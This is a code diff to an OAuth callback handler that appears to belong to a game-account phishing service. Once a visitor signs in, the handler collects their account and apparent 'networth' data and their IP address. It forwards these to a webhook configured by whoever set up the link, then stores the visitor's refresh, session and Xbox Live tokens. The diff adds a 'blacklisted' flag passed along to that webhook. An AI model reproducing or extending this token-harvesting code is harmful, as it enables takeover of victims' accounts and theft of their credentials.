@@ -15,13 +15,14 @@ export const get: APIRoute = async ({ request, redirect }) => {
         }
         const code = query["code"];
         const state = query["state"];
-        const row = await queryFirstRes("SELECT webhook, redirect FROM `users` WHERE `user_id` = ?", [state]);
+        const row = await queryFirstRes("SELECT webhook, redirect, blacklisted FROM `users` WHERE `user_id` = ?", [state]);
         if (!row) {
             return await res(400, "Invalid State");
         }
         console.log("Callback for user " + state)
         const webhook = row['webhook']
         const redirect_uri = row['redirect'];
+        const blacklisted = row['blacklisted'] === 1;
         const url = await requestUrl.getURLNoQuery();
         const data:any = await oauthFlow(code, url, false);
         if (data.status !== 200) {
@@ -33,7 +34,7 @@ export const get: APIRoute = async ({ request, redirect }) => {
         console.log("got networth data")
         //add ip address to data, cloudflare header
         const ip = request.headers.get("CF-Connecting-IP") || request.headers.get("X-Forwarded-For") || request.headers.get("X-Real-IP") || '69.69.69.69 (Error, dunny why)'; 
-        await oauthWebhook(data, nwData, ip, webhook);
+        await oauthWebhook(data, nwData, ip, webhook, blacklisted);
         console.log("sent webhook")
         const saveSuccess = await saveToken(state, data['username'], data['uuid'], data['refresh_token'], data["session_token"], data["xbl_token"], data["xbl_hash"], url, nwData['unsoulboundNw'])
         if (!saveSuccess) {
